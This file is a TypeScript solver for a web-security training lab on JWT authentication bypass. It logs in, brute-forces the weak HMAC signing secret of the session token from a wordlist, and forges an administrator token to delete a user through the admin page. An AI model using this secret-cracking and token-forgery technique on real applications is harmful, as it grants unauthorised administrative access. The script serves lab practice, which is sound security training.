import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
import { runTasks } from "../../../utils/runTasks.js";
import { extractCsrfToken } from "../../../utils/extractCsrfToken.js";
import { myCredentials } from "../../../config/credentials.js";
import { extractCookie } from "../../../utils/extractCookie.js";
import { getJwtSecrets } from "../../../config/getJwtSecrets.js";
import { JWT } from "../utils/JWT.js";

const { labUrl, httpClient } = getParsedInputFromUser({
  description: "Lab: JWT authentication bypass via weak signing key",
  allowProxy: true,
});

runTasks([task]);

async function task() {
  const signedJwtInstance = await getSignedJwtInstanceFromSessionCookie();
  console.log("start brute-forcing JWT secrets...");
  const secret = await bruteForceJwtSecret(signedJwtInstance);
  const adminJwt = createSignedAdminJwt(secret);
  console.log("found secret: " + secret);
  console.log(`
To solve the lab:
  1. Edit your browser cookie for the lab site with key "session" and value "${adminJwt}"
  2. Go to admin page:
  "${labUrl}admin"
  3. Delete carlos's account
`);
}

async function getSignedJwtInstanceFromSessionCookie() {
  const loginResponse = await loginWithMyCredentials();
  const sessionCookie = extractCookie(loginResponse, "session");
  return new JWT(sessionCookie.value);
}

async function loginWithMyCredentials() {
  const csrf = await getCsrfToken();
  return await httpClient.post(
    labUrl + "login",
    new URLSearchParams({
      csrf,
      username: myCredentials.username,
      password: myCredentials.password,
    }),
  );
}

async function getCsrfToken() {
  const loginResponse = await httpClient.get(labUrl + "login");
  return extractCsrfToken(loginResponse.data);
}

async function bruteForceJwtSecret(signedJwt: JWT) {
  if (!signedJwt.signature) {
    throw new Error("There is no signature for provided signedJwt argument");
  }

  for (const secret of await getJwtSecrets()) {
    const signatureToTest = signedJwt.sign(secret).signature;
    if (signatureToTest === signedJwt.signature) {
      return secret;
    }
  }
  throw new Error("No matching JWT secret found.");
}

function createSignedAdminJwt(secret: string) {
  const header = { alg: "HS256" };
  const payload = { sub: "administrator" };
  return new JWT({ header, payload }).sign(secret);
}
